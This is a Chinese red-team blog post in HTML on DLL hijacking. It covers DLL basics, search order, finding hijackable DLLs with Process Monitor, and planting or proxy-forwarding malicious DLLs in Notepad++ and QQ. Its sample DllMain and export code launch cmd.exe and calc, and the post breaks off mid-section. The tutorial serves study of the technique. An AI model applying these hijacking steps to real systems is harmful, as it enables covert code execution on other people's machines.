@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2024/11/07/DLL%E5%8A%AB%E6%8C%81/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/11/07/DLL%E5%8A%AB%E6%8C%81/","path":"2024/11/07/DLL劫持/","title":"初探DLL劫持"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>初探DLL劫持 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFDLL"><span class="nav-text">什么是DLL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DLL%E5%87%BD%E6%95%B0"><span class="nav-text">DLL函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DLL%E5%88%9B%E5%BB%BA"><span class="nav-text">DLL创建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C"><span class="nav-text">命令行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VS"><span class="nav-text">VS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BDDLL"><span class="nav-text">加载DLL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="nav-text">DLL劫持</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DLL%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F"><span class="nav-text">DLL加载顺序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DLL%E5%8A%AB%E6%8C%81%E5%8F%91%E7%8E%B0"><span class="nav-text">DLL劫持发现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Process-Monitor"><span class="nav-text">Process Monitor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="nav-text">自动化工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F"><span class="nav-text">其他方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DLL%E5%8A%AB%E6%8C%81%E5%88%A9%E7%94%A8"><span class="nav-text">DLL劫持利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2dll"><span class="nav-text">替换dll</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BD%AC%E5%8F%91%E5%8A%AB%E6%8C%81"><span class="nav-text">转发劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%BD%AC%E5%8F%91"><span class="nav-text">直接转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%B3%E6%97%B6%E8%B0%83%E7%94%A8"><span class="nav-text">即时调用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E7%A7%8D%E6%9B%B4%E5%8A%A0%E9%80%9A%E7%94%A8%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">一种更加通用的方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="nav-text">实际利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E5%8A%A0%E9%BB%91"><span class="nav-text">白加黑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL%E5%8A%A0%E8%BD%BD%E4%B8%8A%E7%BA%BF"><span class="nav-text">DLL加载上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94%E7%A8%8B%E5%BA%8FDLL%E5%8A%AB%E6%8C%81"><span class="nav-text">文件关联程序DLL劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BDexe"><span class="nav-text">加载exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/07/DLL%E5%8A%AB%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="初探DLL劫持 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          初探DLL劫持
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-07 21:03:21" itemprop="dateCreated datePublished" datetime="2024-11-07T21:03:21+08:00">2024-11-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824021558426.png" alt="image-20220824021558426"></p>
+<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>浅学DLL相关</p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
+<li>VS2022</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43997331/article/details/104764873">cl.exe环境变量配置</a></li>
+</ul>
+<h1 id="什么是DLL"><a href="#什么是DLL" class="headerlink" title="什么是DLL"></a>什么是DLL</h1><p>DLL。在WIndows中DLL(Dynamic link library，动态链接库)是一个共享的库，其中包含可同时由多个程序使用的代码和数据，对常用函数和功能进行封装，这些DLL可实现不同的功能，每个DLL的功能实现可通过 <strong>导出函数来提供调用接口</strong>，在Windows的不同系统目录中存在大量的DLL文件，应用程序在实现时相应的功能时会调用这些DLL程序。</p>
+<p>动态库：在使用动态库时，往往提供两个文件：一个引入库（.lib，非必须）和一个.dll文件。.lib文件包含该动态库导出的函数和变量的符号名，而.dll文件包含该动态库实际的函数和数据。</p>
+<h1 id="DLL函数"><a href="#DLL函数" class="headerlink" title="DLL函数"></a>DLL函数</h1><p>在实现dll之前先搞懂几个预置的概念，dll文件所实现的功能是它的函数所提供的，分为两种：一、入口函数(DllMain)，二、导出函数。</p>
+<ul>
+<li>DllMain</li>
+</ul>
+<blockquote>
+<p>动态链接库的可选入口点 (DLL) 。 当系统启动或终止进程或线程时，它会使用进程的第一个线程调用每个已加载 DLL 的入口点函数。 当使用 LoadLibrary 和 FreeLibrary 函数加载或卸载 DLL 时，系统还会调用 DLL 的入口点函数。</p>
+</blockquote>
+<p>不是必须的函数，而且我们可以在不同的调用模式下写入我们自己的代码。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule, <span class="comment">//  DLL模块的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call, <span class="comment">// 调用函数的原因</span></span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved  <span class="comment">// 保留参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:      <span class="comment">// 进程加载DLL触发( LoadLibraryA)</span></span><br><span class="line">        &#123;  <span class="built_in">printf</span>(<span class="string">&quot;DLL_PROCESS_ATTACH!\n&quot;</span>);</span><br><span class="line">        WinExec(<span class="string">&quot;cmd.exe&quot;</span>, <span class="number">0</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:       <span class="comment">// 进程创建新线程加载触发(CreateThread)</span></span><br><span class="line">        &#123;  <span class="keyword">break</span>; &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:       <span class="comment">// 线程正常退出(CreateThread-Return)</span></span><br><span class="line">        &#123;  <span class="keyword">break</span>; &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:      <span class="comment">// 进程卸载DLL(函数：FreeLibrary、FreeLibraryAndExitThread)</span></span><br><span class="line">        &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>导出函数</li>
+</ul>
+<p>将我们写的函数导出的方式有两种：一、使用 __declspec(dllexport) ，二、使用模块定义（.def）文件。这里只记录一下第一种。</p>
+<p>mydll.c，在函数前加上关键字__declspec(dllexport)</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;cmd /c calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另外我们可以使用 <strong>dumpbin</strong> 命令查看dll文件的导出函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dumpbin mydll.dll &#x2F;exports</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815161028072.png" alt="image-20220815161028072"></p>
+<p>针对于C++编译器，编译后的函数名为 fnDll2@xxxxx ，这是因为c++编译器基于函数重载的考虑，会更改函数名，为了避免这种现象，可以使用 <strong>extern “C”</strong> 指令来命令c++编译器以c编译器的方式来命名该函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; __declspec(dllexport) void calc()&#123;</span><br><span class="line">    system(&quot;cmd &#x2F;c calc&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815172231208.png" alt="image-20220815172231208"></p>
+<h1 id="DLL创建"><a href="#DLL创建" class="headerlink" title="DLL创建"></a>DLL创建</h1><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>利用微软cl.exe，将mydll.c编译成dll文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cl mydll.c &#x2F;LD</span><br></pre></td></tr></table></figure>
+
+<p>多了lib文件和dll文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815161203906.png" alt="image-20220815161203906"></p>
+<h2 id="VS"><a href="#VS" class="headerlink" title="VS"></a>VS</h2><p>提供两种</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815162302951.png" alt="image-20220815162302951"></p>
+<p>选择具有导出项的动态链接库，编写恶意代码。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815163409170.png" alt="image-20220815163409170"></p>
+<h1 id="加载DLL"><a href="#加载DLL" class="headerlink" title="加载DLL"></a>加载DLL</h1><p>dll的加载有两种方式</p>
+<ul>
+<li>隐式调用（load-time dynamic linking）也叫静态链接</li>
+</ul>
+<p>使用 <strong>#include &lt;xxx.h&gt;**导入头文件和 **#pragma comment(lib, “xxx.lib”)</strong> 导入链接库文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;testDLL.h&quot;</span><br><span class="line">#pragma  comment(lib,&quot;testDLL.lib&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>右键解决方案，添加新建控制台应用，项目名称为Test，编写程序调用dll中的函数。ctrl+f5运行。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815173612769.png" alt="image-20220815173612769"></p>
+<p>如果调用的函数在恶意dll文件中不存在，程序会报出错误，并且也<strong>不会执行DllMain函数</strong></p>
+<ul>
+<li>显式调用（run-time dynamic linking）也叫动态链接</li>
+</ul>
+<p>通过 <strong>LoadLiabrary</strong> 函数显示加载dll。需要注意的是这时候我们不再需要注册.lib文件，也不需要声明外部函数。只要在需要使用的地方调用dll文件即可。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*DLLFUNC)</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">//定义函数指针</span></span><br><span class="line">    DLLFUNC func = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    HINSTANCE DLL = LoadLibrary(<span class="string">L&quot;Dll2.dll&quot;</span>);  <span class="comment">//DLL句柄</span></span><br><span class="line">    <span class="keyword">if</span> (DLL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        func = (DLLFUNC)GetProcAddress(DLL, <span class="string">&quot;?fnDll2@@YAHXZ&quot;</span>); <span class="comment">//获取函数地址</span></span><br><span class="line">        <span class="keyword">if</span> (func != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            func();  <span class="comment">//调用</span></span><br><span class="line">        &#125;</span><br><span class="line">        FreeLibrary(DLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test123&quot;</span>);  <span class="comment">//卸载dll</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有个注意的点，这里要使用被修饰的函数名</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815180738493.png" alt="image-20220815180738493"></p>
+<p>修改.h文件即可使用原函数名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; __declspec(dllexport) int fnDll2(void);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815180925346.png" alt="image-20220815180925346"></p>
+<p>即使调用了不存在的函数，不会报错，也 <strong>会执行DllMain函数</strong></p>
+<h1 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h1><p>如果在进程尝试加载一个DLL时没有并没有 <strong>指定DLL的绝对路径</strong>，那么Windows会尝试去按照顺序搜索这些特定目录来查找这个DLL,如果攻击者能够将恶意的DLL放在优先于正常DLL所在的目录，那么就能够欺骗系统去加载恶意的DLL。</p>
+<h1 id="DLL加载顺序"><a href="#DLL加载顺序" class="headerlink" title="DLL加载顺序"></a>DLL加载顺序</h1><p>在程序通过上述两种方式加载DLL时，都会进行DLL的搜索。会加载搜索过程中找到的第一个名称正确的DLL。系统搜索DLL之前，它会检查以下内容，如果已经存在了就不会搜索DLL：</p>
+<ul>
+<li><p>如果内存中已经加载了具有相同模块名称的 DLL</p>
+</li>
+<li><p>KnownDLLs注册表项（HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs）</p>
+</li>
+</ul>
+<p>上面都没有找到DLL的情况下，如果启用了 <strong>SafeDllSearchMode</strong>， 就按照如下搜索顺序搜索：</p>
+<ul>
+<li><p>应用程序加载目录(安装目录)</p>
+</li>
+<li><p>系统目录(C:\Windows\System32，使用 GetSystemDirectory 函数获取)</p>
+</li>
+<li><p>16 位系统目录(C:\Windows\System)</p>
+</li>
+<li><p>Windows 目录(C:\Windows,使用 GetWindowsDirectory函数获取)</p>
+</li>
+<li><p>当前目录</p>
+</li>
+<li><p>PATH 环境变量中列出的目录</p>
+</li>
+</ul>
+<p>如果 <strong>SafeDllSearchMode</strong> 已禁用，则搜索顺序如下：</p>
+<ul>
+<li><p>应用程序加载目录(安装目录)</p>
+</li>
+<li><p>当前目录</p>
+</li>
+<li><p>系统目录(C:\Windows\System32，使用 GetSystemDirectory 函数获取)</p>
+</li>
+<li><p>16 位系统目录(C:\Windows\System)</p>
+</li>
+<li><p>Windows 目录(C:\Windows,使用 GetWindowsDirectory函数获取)</p>
+</li>
+<li><p>PATH 环境变量中列出的目录</p>
+</li>
+</ul>
+<p>PS: Windows操作系统通过 <strong>DLL路径搜索目录顺序</strong> 和 <strong>Know DLLs注册表项</strong> 的机制来确定应用程序所要调用的DLL的路经，之后，应用程序就将DL_L载入了自己的内存空间，执行相应的函数功能。</p>
+<p>Know DLLs注册表项 <strong>指定的DLL</strong> 是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</span><br></pre></td></tr></table></figure>
+
+<h1 id="DLL劫持发现"><a href="#DLL劫持发现" class="headerlink" title="DLL劫持发现"></a>DLL劫持发现</h1><h2 id="Process-Monitor"><a href="#Process-Monitor" class="headerlink" title="Process Monitor"></a>Process Monitor</h2><p>利用 Process Monitor 手动挖掘，设置为：</p>
+<p>允许这些</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Operation is CreateFile</span><br><span class="line">Operation is Load Image</span><br><span class="line">Path contains .cpl</span><br><span class="line">Path contains .dll</span><br><span class="line">Path contains .drv</span><br><span class="line">Path contains .exe</span><br><span class="line">Path contains .ocx</span><br><span class="line">Path contains .scr</span><br><span class="line">Path contains .sys</span><br></pre></td></tr></table></figure>
+
+<p>排除这些</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Process Name is procmon.exe</span><br><span class="line">Process Name is Procmon64.exe</span><br><span class="line">Process Name is System</span><br><span class="line">Operation begins with IRP_MJ_</span><br><span class="line">Operation begins with FASTIO_</span><br><span class="line">Result is SUCCESS</span><br><span class="line">Path ends with pagefile.sys</span><br></pre></td></tr></table></figure>
+
+<p>运行上面编译生成的exe，目录下没有dll文件单独执行，按照加载顺序进行加载dll文件，其次存在 <strong>LoadLibrary(Ex)</strong> 说明该dll文件是被进程动态加载，这样直接使用恶意dllmain函数的dll文件即可利用。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816011747152.png" alt="image-20220816011747152"></p>
+<p>这里拿notepad++6.6.6试试，发现直接就加载当前目录下的SciLexer.dll</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816022407377.png" alt="image-20220816022407377"></p>
+<p>写一个dll，尝试在DllMain函数中弹个计算器，替换后执行exe</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816022657161.png" alt="image-20220816022657161"></p>
+<p>虽然成功加载Dllmain函数进行劫持，但是缺点也很明显，当调用后续函数时，报错没法执行，为了解决这种情况，下面要学一下DLL中的转发，悄无声息的执行我们的代码。</p>
+<h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p>ImpulsiveDLLHijack、Rattler、Robber等</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816014408409.png" alt="image-20220816014408409"></p>
+<h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><p>发现个骚的手法，单独把exe拉出来运行，看报什么错</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816014644209.png" alt="image-20220816014644209"></p>
+<p>或者本目录下排除法删除dll文件，加载中的DLL因为句柄占用无法删除。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816023026821.png" alt="image-20220816023026821"></p>
+<h1 id="DLL劫持利用"><a href="#DLL劫持利用" class="headerlink" title="DLL劫持利用"></a>DLL劫持利用</h1><h2 id="替换dll"><a href="#替换dll" class="headerlink" title="替换dll"></a>替换dll</h2><p>submitline，加载当前目录下的dbghelp.dll。写个同名恶意dll即可利用</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220822144647915.png" alt="image-20220822144647915"></p>
+<h2 id="转发劫持"><a href="#转发劫持" class="headerlink" title="转发劫持"></a>转发劫持</h2><p>利用工具创建出具有转发功能的恶意dll，在程序调用某个函数时，先调用恶意dll，再转发调用原始dll中的函数，这里就分为两种，直接转发与即时调用，直接转发的利用方式只能在DllMain中利用，即时调用是在恶意dll中加载原始dll中某个函数的地址，然后进行调用，这样可以在恶意dll中创建同名函数，插入恶意代码，然后进行寻址调用，达到转发目的。</p>
+<p>这里利用工具：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-224408.htm">AheadLib修改 支持x64支持类/命名空间</a></p>
+<h3 id="直接转发"><a href="#直接转发" class="headerlink" title="直接转发"></a>直接转发</h3><p>以QQ为例子，对libuv.dll进行转发，AheadLib+生成一个cpp文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004503216.png" alt="image-20220823004503216"></p>
+<p>vs 新建 DLL项目后，添加上代码，可以看到原dll文件有许多导出函数 ，通过这句话实现函数的转发</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;SciLexerOrg.Scintilla_DirectFunction,@1&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>main函数加上代码，生成32位的dll</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004354009.png" alt="image-20220823004354009"></p>
+<p>改变原dll文件名，Org为原始dll。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004442303.png" alt="image-20220823004442303"></p>
+<p>双击qq弹出计算器</p>
+<p>这种方法会出现一种情况，虽然先调用了恶意dll后转发到原始dll，但是不清楚主程序的需求是什么可能是一个返回值，也可能参数不正确，这个时候都会导致主程序运行出错。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823005011353.png" alt="image-20220823005011353"></p>
+<h3 id="即时调用"><a href="#即时调用" class="headerlink" title="即时调用"></a>即时调用</h3><p>说白了就是在恶意dll文件中多加几行代码，LoadLibrary原始dll后通过GetAddress获取函数地址，然后跳到导出函数的地址，实现在恶意dll中进行调用原始函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010058231.png" alt="image-20220823010058231"></p>
+<p>main函数中调用load函数</p>
